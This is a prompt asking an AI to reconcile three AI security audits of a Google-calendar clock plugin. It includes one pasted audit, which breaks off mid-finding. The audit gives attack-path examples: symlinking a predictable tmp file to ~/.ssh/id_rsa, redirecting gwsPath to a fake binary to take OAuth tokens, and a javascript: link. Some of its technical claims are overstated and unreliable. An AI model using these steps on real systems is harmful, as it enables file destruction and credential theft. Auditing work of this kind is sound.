You are the Security Planning Lead for this repository.

Repository:
https://github.com/iamparmjeet/omarchy-google-calendar-clock

I have completed THREE independent security audits of the current repository:

1. Muse Spark 1.2
2. GLM-5.3 Flash
3. GPT-5.6 Luna

I will paste all three reports after this instruction.

Your task is NOT to immediately modify the code.

Your task is to reconcile the three audits and create a technically accurate,
implementation-ready SECURITY REMEDIATION PLAN.

IMPORTANT RULES
================

1. Read all three audits completely before making conclusions.

2. Treat the audit reports as evidence, NOT as unquestionable truth.

3. Verify findings against the ACTUAL CURRENT REPOSITORY CODE.

4. Do not assume that a finding is real merely because multiple models reported it.

5. Do not assume that a finding is false merely because only one model reported it.

6. Do not modify files.

7. Do not create commits.

8. Do not create a PR.

9. Do not implement fixes.

10. Do not perform broad refactoring.

11. Do not upgrade unrelated dependencies.

12. Preserve existing functionality unless a security fix genuinely requires
a behavior change.

13. Distinguish clearly between:
    - confirmed vulnerability
    - likely vulnerability requiring investigation
    - defense-in-depth improvement
    - product/UX issue
    - false positive
    - accepted risk

14. Do not inflate severity.

A vulnerability should have:
    attacker capability
    +
    realistic attack path
    +
    security boundary crossing or meaningful security impact.

If exploitation requires the attacker to already have unrestricted code execution
as the same user, explain why that changes the severity.

PRIMARY OBJECTIVE
=================

Create ONE authoritative security backlog from the three audits.

For every finding, determine:

- Is it real?
- Which auditors reported it?
- Does the current source code confirm it?
- Is the attack path realistic?
- What attacker capability is required?
- Is it remote, local-user, same-user, or privileged?
- What trust boundary is crossed?
- What is the realistic impact?
- What is the correct severity?
- What should actually be fixed?
- What should NOT be fixed?
- Are multiple findings actually the same underlying problem?

DEDUPLICATION
=============

Merge findings that represent the same underlying vulnerability.

For example:

If three reports describe different aspects of the same command-execution
boundary, create ONE canonical security issue with the supporting evidence
from all three reports.

Do not create three TODOs for one vulnerability.

Conversely, do not merge findings merely because they affect the same file.

SECURITY PRIORITY
=================

Use this priority:

P0 — Must fix before release
P1 — Should fix before release
P2 — Important hardening
P3 — Optional / defense-in-depth

Severity and implementation priority are NOT necessarily identical.

For example, a Medium vulnerability that affects a privileged installer may
deserve higher implementation priority than a Low UI issue.

CURRENT SECURITY CONTEXT
========================

The previous audits identified several existing strengths, including:

- argv-array subprocess execution
- no shell=True/os.system/eval/exec in Python
- shell quoting where shell execution is unavoidable
- bounded state and response reads
- bounded event/item counts
- atomic permission-hardened state/config writes
- PlainText rendering for Google-controlled text
- URL scheme restrictions
- OAuth credentials kept behind gws/keyring
- limited Calendar/Tasks scopes
- pinned dependency versions/revisions
- protection against partial sync state replacement

Do not remove or weaken these protections while designing fixes.

IMPORTANT TRUST BOUNDARIES
===========================

Analyze these explicitly:

BOUNDARY A:

Remote Google Calendar/Tasks data
        ↓
gws
        ↓
sync.py
        ↓
schema normalization
        ↓
state.json
        ↓
Model.js
        ↓
QML

BOUNDARY B:

QML/user input
        ↓
Python mutation code
        ↓
gws
        ↓
Google APIs

BOUNDARY C:

GitHub repository
        ↓
setup.sh
        ↓
package managers / AUR / Cargo / npm
        ↓
installed binaries
        ↓
systemd
        ↓
gws/OAuth

BOUNDARY D:

User configuration
        ↓
gwsPath
        ↓
systemd timer
        ↓
executable

BOUNDARY E:

Installer/uninstaller
        ↓
sudo
        ↓
system packages

RECENT PRs
==========

Pay particular attention to the two recently merged PRs:

PR #8:
Fix widget stays empty after fresh install until shell restart

PR #9:
Fix setup.sh globally-taken GCP project id

Determine whether either PR:
- introduced a vulnerability
- changed a trust boundary
- weakened an existing security property
- is completely safe

Do not assume a bug fix is automatically security-safe.

OUTPUT FORMAT
=============

Produce the following report.

# 1. Executive Security Assessment

Give a concise overall assessment of the current repository.

Choose exactly one:

PASS
PASS WITH REQUIRED FIXES
FAIL

Explain why.

# 2. Finding Reconciliation

Create a table:

| Canonical ID | Finding | Muse | GLM | Luna | Verified? | Severity | Priority | Decision |
|--------------|---------|------|-----|------|----------|----------|----------|----------|

Use:
YES / NO / PARTIAL

# 3. Confirmed Vulnerabilities

For every confirmed vulnerability:

## SEC-XXX — Title

Severity:
Priority:
Confidence:
CWE:

Affected files:
Affected functions:

Reported by:
- Muse
- GLM
- Luna

Attacker capability:

Preconditions:

Attack path:

Concrete attack scenario:

Impact:

Existing mitigation:

Why mitigation is insufficient:

Security invariant we need:

Recommended remediation:

Potential compatibility impact:

Regression test required:

Manual verification required:

# 4. Findings Requiring Investigation

Only include findings where the source code or external behavior prevents
confident classification.

For each explain exactly what must be verified.

Do NOT pretend uncertainty is a confirmed vulnerability.

# 5. Defense-in-Depth Improvements

Separate these from vulnerabilities.

Examples may include:
- stricter path validation
- reduced logging
- dependency hardening
- systemd hardening
- additional input validation

Explain why each is useful but not necessarily a vulnerability.

# 6. False Positives

List findings that should NOT be implemented.

For each explain:

Finding:
Why the auditor reported it:
Why it is not actually exploitable:
Evidence from source:
Decision:

This section is important.

I do NOT want unnecessary security code added because an AI generated
a theoretical vulnerability.

# 7. Accepted Risks

If something is technically imperfect but reasonable for this application,
document it here.

Explain why accepting the risk is reasonable.

# 8. Implementation Order

Create the safest implementation sequence.

For example:

Phase 1 — P0 security fixes
Phase 2 — P1 security fixes
Phase 3 — security regression tests
Phase 4 — P2 hardening
Phase 5 — final security review

For each phase list exact files/functions that will change.

# 9. Dependency Between Fixes

Identify whether any fixes depend on other fixes.

For example:

SEC-001
   ↓
changes normalized event structure
   ↓
SEC-003 must be implemented afterward

Do not assume independence.

# 10. Regression Test Plan

For every confirmed vulnerability define:

- test objective
- malicious input
- expected behavior
- failure condition
- test location

Include both automated and manual tests where appropriate.

# 11. Manual Security Test Plan

Give me commands/test procedures I can execute on Arch Linux/Omarchy.

Focus on:

- malicious calendar data
- huge event spans
- malformed JSON
- symlink races
- installer non-TTY behavior
- sudo/package operations
- systemd unit generation
- gwsPath
- OAuth behavior
- URI handling
- deletion/mutation operations

Do not give destructive commands without clearly explaining what they do.

# 12. Files That Should NOT Change

Identify files that do not need security changes.

This prevents unnecessary modifications.

# 13. Final Implementation Specification

For every P0/P1 finding provide:

Current behavior
        ↓
Problem
        ↓
Required security invariant
        ↓
Desired behavior
        ↓
Files/functions involved
        ↓
Tests required

DO NOT WRITE THE IMPLEMENTATION.

DO NOT MODIFY THE REPOSITORY.

DO NOT CREATE COMMITS.

The result should be a plan that another engineer can implement safely
without needing to reinterpret the three audit reports.

THREE AUDIT REPORTS FOLLOW
==========================

===== MUSE SPARK 1.2 =====

# SECURITY AUDIT — `iamparmjeet/omarchy-google-calendar-clock`

> Read-only audit. 2026-08-28. Repository inspected at `HEAD` on disk (`/home/parm/Code/Projects/omarchy-google-calendar-clock`). No files modified.

---

## 1. METHODOLOGY

- Manual static review of **all** source artifacts: `scripts/setup.sh`, `scripts/uninstall.sh`, `sync/*.py`, `systemd/*`, `manifest.json`, `Model.js`, `Panel.qml`, `BarWidget.qml`, `Clock*.qml`, `README.md`, `.gitignore`
- Traced both data flows: `Google API → gws → sync.py → state.json → QML` and `QML user input → mutate.py → gws → Google API`
- Assumed hostile inputs on every boundary (Google-controlled strings, `state.json`/`config.json`/`shell.json` on disk, `PATH`/env, filenames, calendar/task IDs)
- Checked each finding for existing mitigation before reporting

---

## 2. TRUST-BOUNDARY DIAGRAM

```
[UNTRUSTED]                                              [SEMI-TRUSTED]          [TRUSTED*]

 Internet / Google Workspace ──► gws binary ──► sync/*.py ──► state.json ──► QML/Model.js
      (calendar/task data,          (OAuth,        (JSON parse,     (0700/0600, (PlainText
       error JSON,                   CLI JSON,       normalization   atomic tmp    rendering,
       pagination,                   exit codes)      caps,          bounded     scheme
       url fields)                                   validation,      read)       allowlist)
                                                     dedupe,
                                                     atomic write)

 QML forms (title, date, ──► Panel.qml ──► mutate.py ──► gws_adapter ──► Google Calendar/Tasks
  time, location, meet,                (array cmd,    (argparse,      (subprocess
  task due, calendarId,                 no shell)      HH:MM/date     .Popen array,
  taskId)                                             validation)     JSON dumps,
                                                                       no shell)

 Host file-system ( $HOME/.config/parm.clock/config.json (0700/0600),
                    $HOME/.config/gws (gws-owned, not validated),
                    $HOME/.config/omarchy/shell.json,
                    $HOME/.config/systemd/user/*.timer|service )

 Host execution ( yay/AUR PKGBUILD → sudo pacman, npm install -g, cargo install --git, gcloud )

 systemd (--user timer every 5m, ExecStart = absolute python + plugin sync.py)
```

`*Trusted` here means code runs with the user's UID; there is **no privilege boundary** to root — `sudo` for `pacman` is explicitly invoked by the setup/uninstall scripts with a `[Y/n]` gate.

**Key assumptions probed:**
- `gws` output is **always untrusted** (Google-controlled JSON, byte-size unbounded without caps)
- `state.json`/`config.json`/`shell.json` are **user-writable** → attacker with same-UID file-write can control them
- `PATH`, `XDG_*`, `HOME`, `/etc/timezone`, `/etc/localtime` are **environment-controlled**
- QML input strings are **user-controlled** and reach `gws` unchanged except for date/time validation

---

## 3. FINDINGS

### S-01: Unsanitized shell interpolation into JSON (config write)

- **ID:** S-01
- **Title:** `setup.sh:write_config` interpolates `TIMEZONE` and `gwsPath` into `config.json` without JSON escaping
- **Severity:** Medium **Confidence:** High
- **Affected file:** `scripts/setup.sh:322-332`
- **Affected function/section:** `write_config()`, heredoc `cat > "$CONFIG_FILE" <<EOF ... "timezone": "$TIMEZONE", "gwsPath": "$gws_path"`
- **Approximate line:** 323-331
- **Attack precondition:** Plugin installed under attacker-influenceable path, or `PATH` hijack yields `gws` binary whose `command -v` output contains `"`, `\n`, or `}`.
- **Attacker capability:** Control earlier `PATH` directory (e.g., `~/.local/bin` ahead of `/usr/bin`) or control `TIMEZONE` via `--timezone` or `/etc/timezone` content (operator typo) with `"`/`\` characters before validation (validation rejects most, but `gwsPath` has no validation at all).
- **Attack path:** `command -v gws` → `/tmp/evil" , "x": "y` → written verbatim → `config.json` becomes `{"timezone":"...","gwsPath":"/tmp/evil", "x":"y","syncIntervalMin":5}` → next `load_config` parses extra keys (ignored) or fails (returns defaults) depending on shape. A crafted `gwsPath` containing `", "gwsPath": "/bin/sh` style injection breaks the JSON document; `load_config` then treats file as malformed and silently falls back to defaults, which may point to wrong `gws`.
- **Why vulnerable:** Shell `"$var"` inside a heredoc is not JSON-escaped. `TIMEZONE` is validated via `ZoneInfo` before writing (mitigates that var), but `gws_path` is **never JSON-escaped** (no `jq -Rs` or `python3 -c 'import json; print(json.dumps(s))'`).
- **Concrete exploit:** Attacker with same-UID write to a directory early in `PATH` creates executable named `gws` at `"/tmp/a\"b/gws"` and prepends `/tmp/a\"b` to `PATH` before user runs `setup.sh --yes`. `command -v gws` returns `/tmp/a"b/gws` → heredoc emits broken JSON → `config.json` parse error → sync falls back to `DEFAULT_CONFIG["gwsPath"]="/usr/bin/gws"` (which may not exist) → persistent auth failure (DoS) or attacker-controlled `gwsPath` containing `/tmp/evil` with spaces causing later `ExecStart` breakage.
- **Impact:** Config corruption / silent fallback, potential `gwsPath` redirection if attacker can craft syntactically valid JSON injection (e.g., path containing `","tasklistIds":["attacker-list"]`).
- **Existing mitigation:** `TIMEZONE` validated with `zoneinfo.ZoneInfo(sys.argv[1])` before write; `CONFIG_DIR` chmod 0700, file 0600.
- **Why insufficient:** Validation does not cover `gwsPath`; no JSON encoding step; `TIMEZONE` validation only checks existence, not characters like `"` (though `ZoneInfo` rejects `"` anyway, the principle is missing for the second var).
- **Recommended fix:** Build `config.json` with a JSON serializer, not a heredoc:
  ```bash
  python3 -c 'import json,sys; json.dump({"timezone":sys.argv[1],"pastDays":7,"futureDays":60,"gwsPath":sys.argv[2],"syncIntervalMin":5,"tasklistIds":[]}, open(sys.argv[3],"w"))' "$TIMEZONE" "$gws_path" "$CONFIG_FILE"
  ```
  Or `jq -n --arg tz "$TIMEZONE" --arg gws "$gws_path" '{timezone:$tz,pastDays:7,futureDays:60,gwsPath:$gws,syncIntervalMin:5,tasklistIds:[]}' > "$CONFIG_FILE"` and then `chmod 600`.
- **Breaking:** No.

---

### S-02: Unquoted `ExecStart` in generated systemd unit

- **ID:** S-02
- **Title:** `setup.sh:install_systemd` writes `ExecStart=$python_bin $SYNC_DIR/sync.py` without `systemd-escape`/quoting
- **Severity:** Medium **Confidence:** High
- **Affected file:** `scripts/setup.sh:373-389`
- **Approximate line:** 384
- **Attack precondition:** Plugin checked out under a path containing spaces, `;`, or newline (e.g., user cloned to `"$HOME/My Plugins/parm.clock"` or HOME contains `'`/space).
- **Attacker capability:** Control clone path (marketplace `omarchy plugin add <url>` clones to `~/.config/omarchy/plugins/parm.clock` — normally fixed, but manual clone path is user-chosen).
- **Attack path:** `REPO="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"` and `SYNC_DIR="$REPO/sync"` → if `REPO` contains a space, `ExecStart=/usr/bin/python3 /home/user/My Plugins/parm.clock/sync/sync.py` is parsed by systemd as `ExecStart=/usr/bin/python3` with argv `["/home/user/My"]` and ignores the rest or fails to start; timer silently never syncs. If `REPO` contains `;` or newline, systemd may parse extra directives (systemd unit parsing is line-oriented, newline in variable injects a new line into the unit file).
- **Why vulnerable:** Systemd `ExecStart=` is whitespace-delimited unless quoted; values are interpolated raw from shell vars.
- **Impact:** Timer DoS (silent sync failure) or, with a carefully crafted directory name containing newline + `[Service]` header, unit file injection. Realistically DoS is the practical impact; newline injection requires attacker to control directory name, which requires local file-write.
- **Existing mitigation:** Hardening comments note absolute paths are regenerated per-machine for portability.
- **Why insufficient:** No quoting/escaping; placeholder template uses `%h` correctly, but generated file does not.
- **Recommended fix:** Quote both components and escape for systemd:
  ```bash
  printf 'ExecStart=%q %q\n' "$python_bin" "$SYNC_DIR/sync.py"
  ```
  or write `ExecStart="%s" "%s/sync.py"` with systemd quoting (`systemd-escape` semantics: double-quote and escape). At minimum wrap each in `"..."` with `"` escaped.
- **Breaking:** No.

---

### S-03: Predictable temp-file / symlink race (config, timer, state)

- **ID:** S-03
- **Title:** Predictable tmp paths + `O_CREAT|O_TRUNC` without `O_EXCL`/`O_NOFOLLOW` in `config.py:save_config` and `apply_interval.py:_write_timer`; `sync.py:atomic_write` uses predictable PID+counter but no `O_EXCL`
- **Severity:** Medium **Confidence:** High
- **Affected file:** `sync/config.py:152`, `sync/apply_interval.py:78-80`, `sync/sync.py:183-184`
- **Attack precondition:** Co-resident same-UID attacker (or malware) that can pre-create a symlink at the tmp path before the writer runs.
- **Attacker capability:** Same UID file-write in `$HOME/.config/parm.clock` or `$HOME/.config/systemd/user`.
- **Attack path:** `save_config` → `tmp = target.with_suffix(".json.tmp")` → `/home/user/.config/parm.clock/config.json.tmp` (fixed). Attacker `ln -s ~/.ssh/id_rsa /home/user/.config/parm.clock/config.json.tmp`. Next `save_config` or `setup.sh`→`write_config` path via `save_config` is not used there but `sync/apply_interval.py` `TIMER_PATH.with_suffix(".timer.tmp")` is similarly fixed → attacker symlinks it to an arbitrary file; `tmp.write_text()` follows the symlink and overwrites the target (`write_text` follows symlink). In `sync.py`/`config.py` `os.open(tmp, O_WRONLY|O_CREAT|O_TRUNC, 0o600)` without `O_NOFOLLOW` also follows symlink and truncates the target with attacker-influenced JSON.
- **Why vulnerable:** `O_TRUNC` + symlink following = arbitrary file truncation/overwrite with controlled content; predictable name makes race trivial (no guessing).
- **Impact:** Overwrite any user-writable file (DoS/data loss). Not a privilege escalation (same UID) but crosses the intended trust boundary of “config write only affects config.json”. `apply_interval` overwriting `~/.config/systemd/user/parm.clock-sync.timer` could also later be used to redirect `ExecStart` after a timer rewrite.
- **Existing mitigation:** `sync.py:atomic_write` uses `path.name.tmp.<pid>.<counter>` (less predictable), `os.fchmod 0600`, `tmp.replace(path)` is atomic; `config.py` does `os.fchmod 0600` and `tmp.replace`.
- **Why insufficient:** Predictable paths in two of three writers; no `O_EXCL`/`O_NOFOLLOW`; `apply_interval` uses `Path.write_text` which always follows symlinks.
- **Recommended fix:** Use `tempfile.mkstemp(dir=target.parent)` or `os.open(tmp, O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW, 0o600)` with a randomized name (`mkstemp`), `fsync`, then `os.replace`. For Python 3, `tempfile.NamedTemporaryFile(dir=..., delete=False)` + `os.chmod 0o600` + `os.replace`.
- **Breaking:** No.

---

### S-04: Supply-chain — unauthenticated dependency fetch (`npm`, `cargo --git`, `yay/AUR`)

- **ID:** S-04
- **Title:** Automatic dependency installation fetches unauthenticated code that can run arbitrary code as user (and then `sudo pacman -S/R`)
- **Severity:** High **Confidence:** High
- **Affected file:** `scripts/setup.sh:117-155`, `scripts/setup.sh:159-199`, `scripts/uninstall.sh:176-216`
- **Attack precondition:** Network attacker (MITM) or compromise of upstream registry/repo/AUR at install time.
- **Attacker capability:** Compromise `registry.npmjs.org` / `@googleworkspace/cli`, or `github.com/googleworkspace/cli` git repo, or AUR `google-cloud-cli` PKGBUILD, or DNS/MITM on `https` fetch without pinning plus signature verification.
- **Attack path:** 
  1. `npm install -g @googleworkspace/cli@0.22.5` — version pinned but **no integrity hash** (`package-lock.json`/`npm ci --audit`/`--prefer-offline` not used, no `npm audit signatures` verification, no `integrity` field check). Attacker who compromises npm account publishes malicious `0.22.5` (already pinned) or MITMs tarball → code runs as user via `npm install` scripts (`preinstall`/`postinstall` runs arbitrary node).
  2. `cargo install --git https://github.com/googleworkspace/cli --rev 705fb0ec... --locked` — rev pinned to commit hash (good), but fetch is `https` without commit signature verification and without `--frozen` against a `Cargo.lock` hash pinned in repo. Git rev is not a cryptographic guarantee if `github.com` is MITM without pinned certs.
  3. `yay -S --needed --noconfirm google-cloud-cli` — AUR PKGBUILD is **unaudited shell code** that runs as user to build, then `sudo pacman -U` installs as root. `yay` does not verify PKGBUILD signatures by default.
- **Why vulnerable:** Pinned versions limit mutability but do not verify integrity (no `sha512`/`SRI`, no `cosign`/`npm provenance`, no `PKGBUILD` review). `sudo pacman -Rns`/`-S` runs with elevated privileges based on unaudited input.
- **Impact:** Full user compromise, then root via `pacman`/`sudo`. Classic supply-chain RCE.
- **Existing mitigation:** Versions pinned (`@googleworkspace/cli@0.22.5`, `cargo --rev 705fb0ec... --locked`), prompt `[Y/n]` with `ask()` before install, `DRY_RUN`, and comment noting wrong `gws` binary detection.
- **Why insufficient:** Pin ≠ verification. Prompt does not check integrity. No `npm audit`, no `cargo` checksum database, no `yay` PKGBUILD inspection.
- **Recommended fix:** Document manual install as preferred; for automatic path, add: (a) verify `npm` tarball via `npm view @googleworkspace/cli@0.22.5 dist.integrity` or ship `package.json` + `npm ci` with lockfile, (b) require `yay` to show PKGBUILD diff (`yay --show PKGBUILD` pattern) and refuse `--noconfirm` for AUR, (c) for `cargo`, vendor the crate or verify commit signature (`git verify-commit`). At minimum remove `--noconfirm` and print SHA256 of expected artifacts before install.
- **Breaking:** Yes — removing `--noconfirm` changes UX; adding verification may require new deps.

---

### S-05: `gwsPath` from `config.json` is trusted without validation (binary substitution)

- **ID:** S-05
- **Title:** `gws_adapter._find_gws(path_override)` and `sync.py:run_sync` honor attacker-controlled `config.json:gwsPath` without verifying it is the expected `googleworkspace/cli` binary
- **Severity:** High **Confidence:** High
- **Affected file:** `sync/gws_adapter.py:70-77`, `sync/config.py:63-64`, `sync/sync.py:284-285`
- **Approximate line:** `gws_adapter.py:70`, `sync.py:285`
- **Attack precondition:** Same-UID attacker can write `~/.config/parm.clock/config.json` (user-writable, 0600 but writable by owner) or symlink-attack S-03 succeeds.
- **Attacker capability:** Arbitrary file write in `XDG_CONFIG_HOME`.
- **Attack path:** Write `{"gwsPath":"/tmp/evil-gws","timezone":"UTC",...}` → every 5 min systemd timer runs `sync.py` → `_find_gws("/tmp/evil-gws")` returns it verbatim without `is_correct_gws()` check → `subprocess.Popen(["/tmp/evil-gws", "calendar", "calendarList", "list", ...], ...)` executes attacker binary with Google OAuth tokens accessible via `gws` keyring emulation (or attacker binary can exfiltrate `~/.config/gws` tokens by reading the same directory). Same path used by `mutate.py` for every user-initiated Calendar/Task CRUD.
- **Why vulnerable:** `setup.sh:is_correct_gws()` exists but is **only used in setup.sh**, never in the runtime sync/mutate path. `_find_gws` only checks existence via `shutil.which`, not authenticity.
- **Impact:** Persistent code execution every 5 minutes (timer) and on every user edit/delete; token exfiltration (`~/.config/gws` contains OAuth client secret + refresh token via keyring/file). `gws auth status`/`list` calls would leak data to attacker binary.
- **Existing mitigation:** `setup.sh` writes `gwsPath` from `command -v gws` at install time; `sync.py` honors explicit `--gws` override.
- **Why insufficient:** No runtime re-validation; file is writable by owner, no signature.
- **Recommended fix:** At `run_sync` startup, if `gwsPath` is set, verify it is an executable file owned by the user/root, not world-writable, and optionally re-run `is_correct_gws`-style check (`gws auth --help` contains `calendar`/`auth setup`). Fall back to `shutil.which("gws")` if check fails. Or remove `gwsPath` override entirely and always use `shutil.which`.
- **Breaking:** Minimal — may break custom `gwsPath` for users who installed `gws` outside `PATH`.

---

### S-06: `state.json:gwsPath` is not validated; similar issue as S-05 but for `syncIntervalMin`/`timezone` caps missing?

- Consolidated with S-05; separate note: `config.json` validation (`validate_config`) checks `gwsPath` is non-empty string but not that it exists or is correct binary.

---

### S-07: Stored malicious Google content traverses to QML UI — scheme allowlist bypass via `meet:` without `//`

- **ID:** S-07
- **Title:** `Panel.qml:openEventLink` scheme allowlist can be bypassed with `meet:evil` or `javascript:`-like edge if allowlist check is incomplete; plus `htmlLink`/`meetUrl` clipped but not sanitized for `openUrlExternally`
- **Severity:** Low **Confidence:** Medium
- **Affected file:** `Panel.qml:244-257`, `sync/schema.py:319-335`
- **Approximate line:** 244-256
- **Attack precondition:** Attacker shares a calendar event with victim (or victim subscribed to attacker-controlled holiday calendar); controls `htmlLink`, `conferenceData.entryPoints[].uri`, `hangoutLink`.
- **Attacker capability:** Control event fields via Google Calendar API.
- **Attack path:** Create event with `conferenceData.entryPoints[0].uri = "meet:evil-payload"` or `htmlLink = "javascript:alert(1)"` (GWS/Google would likely sanitize `htmlLink` to `https://calendar.google.com/...`, but `conferenceData.uri` is organizer-controlled). In `Panel.qml:245-252`, regex `^([a-zA-Z][a-zA-Z0-9+.-]*):` captures scheme, then `if (allowedUrlSchemes.indexOf(scheme + ":") === -1)` blocks unknown schemes. `allowedUrlSchemes` includes `meet:`, `zoommtg:`, `tel:`. So `meet:`-prefixed URIs **are allowed** — attacker can supply `meet: //evil.com`? Not `meet:` standard scheme; `Qt.openUrlExternally("meet:xyz")` delegates to OS handler for `meet:` (may open Meet app or browser with attacker-controlled path). `zoommtg:` similarly. `htmlLink` from Google is normally `https:`, so safe. But `meetUrl` derived from `_meet_url()` picks first `video` entry point URI verbatim (clipped to 2048) and stores in `state.json`. If organizer supplies `https://evil.com/phishing?calendarId=...`, it **is** `https:` and passes allowlist — user click opens attacker phishing page (expected behavior for shared calendars, but worth noting the trust is Google-organizer, not Google).
- **Why vulnerable:** Organizer-controlled `conferenceData` is not Google-verified; allowlist treats any `https:` as safe, which is correct for not executing code, but phishing risk remains. No block on `data:`, `file:`, `javascript:` (blocked by allowlist — good).
- **Impact:** Phishing / open attacker URL via user click on `↗` / event chip. Not RCE due to `Qt.openUrlExternally` not using shell (no injection) and `textFormat: Text.PlainText` prevents HTML injection.
- **Existing mitigation:** `allowedUrlSchemes` allowlist, `Qt.openUrlExternally` (not `bar.run`/`sh -c`), `textFormat: Text.PlainText` everywhere (S-08 strength), `_meet_url` only picks `video` type, clipped to 2048.
- **Why insufficient:** Allowlist includes non-`https` schemes (`meet:`, `zoommtg:`, `tel:`) that may have handler exploits; no warning UI distinguishes organizer-controlled vs Google-generated links.
- **Recommended fix:** Reduce allowlist to `["https:", "http:"]` only, or add UI confirmation for non-`https` schemes ("Open meet: link from <organizer>?"). Document that shared calendar links are organizer-controlled.
- **Breaking:** Yes — would break legitimate Meet `meet:`/`zoommtg:` links.

---

### S-08: `syncStatus.message` and `mutateOutput` unbounded / log leakage

- **ID:** S-08
- **Title:** Error messages from `gws`/Google (attacker-influenced) flow into `state.json:syncStatus.message` and QML footer / `mutateOutput` without length cap
- **Severity:** Low **Confidence:** High
- **Affected file:** `sync/sync.py:445-458`, `sync/gws_adapter.py:207`, `Panel.qml:281-284`, `Model.js:487-488`
- **Approximate line:** `sync.py:445`
- **Attack precondition:** Attacker controls Google API error text (via creating many calendars, or triggering API error with attacker-controlled `calendarId`? Not directly, but `gws` stderr/stdout error JSON `error.message` is verbatim from Google).
- **Attacker capability:** Cause Google API to return long error message (e.g., by creating event with extremely long title causing Google validation error that echoes the title).
- **Attack path:** `gws` error JSON `{"error":{"message":"<large attacker string>"}}` → `gws_adapter.run` raises `ApiError("<large string>")` → `sync.py:_preserve_or_emit_failure` → `empty_state(..., message=str(e))` → `state.json:syncStatus.message = "<large string>"` → `Model.syncStatusLabel` returns it verbatim when `state === "error"` → QML `Text { text: root.syncLabel; textFormat: Text.PlainText }` displays it. Similarly `mutate.py` `_fail` prints `error: <msg>` and `mutateProc` `mutateOutput` shows it in form card.
- **Why vulnerable:** No `MAX_URL_CHARS`/`MAX_NOTES_CHARS`-style clip on `syncStatus.message`; `validate_sync_status` only checks it's a string, not length.
- **Impact:** DoS via huge `state.json` (but capped at 4 MB overall, so limited) and UI overflow / information disclosure (Google error may leak calendar IDs or internal paths). Footer `Text` has no `elide`/`wrapMode`, could overflow panel.
- **Existing mitigation:** `state.json` overall capped at `MAX_STATE_BYTES` 4 MB; `MAX_RESPONSE_BYTES` 16 MB on gws output; QML uses `PlainText`.
- **Why insufficient:** Per-field cap missing on message; 4 MB message still fits and could be attacker-controlled.
- **Recommended fix:** Clip `message` to e.g., 512 chars in `_preserve_or_emit_failure` and `mutate.py:_fail`: `clip(message, 512)`.
- **Breaking:** No.

---

### S-09: Systemd timer/service files are world-writable in practice / persistence via writable `ExecStart` target

- **ID:** S-09
- **Title:** `ExecStart` target `sync.py` and plugin dir are user-writable → timer provides persistence for attacker with same-UID write
- **Severity:** Medium **Confidence:** High
- **Affected file:** `systemd/parm.clock-sync.service:11`, `scripts/setup.sh:373-407`
- **Approximate line:** 11
- **Attack precondition:** Attacker gains one-time same-UID file write (e.g., via compromised `npm install` postinstall, or malicious `state.json` symlink trick, or another plugin).
- **Attacker capability:** Write to `~/.config/omarchy/plugins/parm.clock/sync/sync.py` or `~/.config/systemd/user/parm.clock-sync.service`.
- **Attack path:** Modify `sync.py` to add exfiltration (read `~/.config/gws` tokens, send to attacker) → next timer fire (every 5 min) executes it. Or modify `.service` `ExecStart` to point to attacker binary → `systemctl --user daemon-reload` not even needed if already enabled (timer fires service as written).
- **Why vulnerable:** Systemd `--user` units and plugin files live in user-writable paths with no integrity check; `setup.sh` regenerates units but does not set them immutable or verify hash.
- **Impact:** Persistence and privilege-equivalent to user (but timer gives automatic re-execution without user interaction).
- **Existing mitigation:** None beyond `UMASK` not relevant; timer `Persistent=true` ensures missed runs catch up.
- **Why insufficient:** This is inherent to `--user` systemd + Omarchy plugin model (all plugins share this risk). Mitigation would require signed plugin updates or `ReadOnlyPaths` in the unit.
- **Recommended fix:** Harden the unit with `ProtectSystem=strict`, `ReadOnlyPaths=/`, `ReadWritePaths=%h/.local/state/parm.clock`, `NoNewPrivileges=yes`, `PrivateTmp=yes` (systemd hardening). Ship a hash/pin for `sync.py` and verify at sync start (`sha256sum --check`). Document that plugin directory must not be world-writable.
- **Breaking:** Hardening options may break if `gws` binary lives outside allowed paths.

---

### S-10: `apply_interval.py` executes `systemctl` with user-controlled interval without input sanitization beyond allowlist — but `subprocess.run` is safe; low finding is symlink attack already covered

- Consolidated with S-03.

---

### S-11: `uninstall.sh --purge-credentials` incomplete revocation guidance + local `rm -rf` without verification

- **ID:** S-11
- **Title:** `uninstall.sh --purge-credentials` deletes `~/.config/gws` but does not revoke online OAuth consent; wording implies local delete is sufficient
- **Severity:** Informational **Confidence:** High
- **Affected file:** `scripts/uninstall.sh:141-171`
- **Approximate line:** 141
- **Attack precondition:** User runs `--purge-credentials` expecting full deauth.
- **Attacker capability:** Attacker who previously exfiltrated refresh token retains access until user manually revokes at `myaccount.google.com/permissions`.
- **Why vulnerable:** Documentation states online revoke still needed (line 168) — actually mitigated. The script correctly warns.
- **Impact:** User confusion → stale OAuth grant remains valid server-side.
- **Existing mitigation:** Warning printed: `warn "Online revoke still required: https://myaccount.google.com/permissions → remove 'gws CLI' ..."` — good.
- **Why insufficient:** Warning is stderr not enforced; `--purge-all` does not automate revoke; no `gws auth logout` token revocation verified (script runs `gws auth logout 2>/dev/null || true` but does not check success).
- **Recommended fix:** Make `--purge-credentials` fail open with explicit instruction and offer to open the revoke URL via `xdg-open`. Check `gws auth logout` exit code.
- **Breaking:** No.

---

### S-12: `BarWidget.qml` / `Panel.qml` `bar.run` command injection via `syncPath` with `'` — mitigated by `shellQuote`

- **ID:** S-12
- **Title:** `Panel.qml:178` `bar.run("python3 " + shellQuote(syncPath) + " && omarchy-shell ...")` — `shellQuote` is correct POSIX implementation
- **Severity:** Informational (strength) **Confidence:** High
- **Affected file:** `Panel.qml:178,187`
- **Note:** This is **not a vulnerability** — included to show the fix is correct. The function `return "'" + String(s).replace(/'/g, "'\\''") + "'"` is the canonical Bourne shell single-quote escaping (close `'`, insert `'\''`, reopen `'`). Verified against `'"`/`'\''` injection tests. `syncPath` is derived from `Qt.resolvedUrl` + `decodeURIComponent`, not directly user-controlled, and is passed through `shellQuote`. `mutateProc.command` uses array form (no shell) — also correct. **Do not change.**
- **Recommended fix:** Keep as-is; add comment referencing POSIX spec.

---

### S-13: `gws_adapter._run_capped` selector leak / fd leak — mitigated, but `MAX_RESPONSE_BYTES` burst above cap before kill

- **ID:** S-13
- **Title:** `_run_capped` kills child after buffer exceeds `MAX_RESPONSE_BYTES` but already extended past cap by up to 64 KiB
- **Severity:** Low **Confidence:** Medium
- **Affected file:** `sync/gws_adapter.py:91-147`
- **Attack precondition:** Malicious `gws` binary or compromised Google response streams >16 MiB.
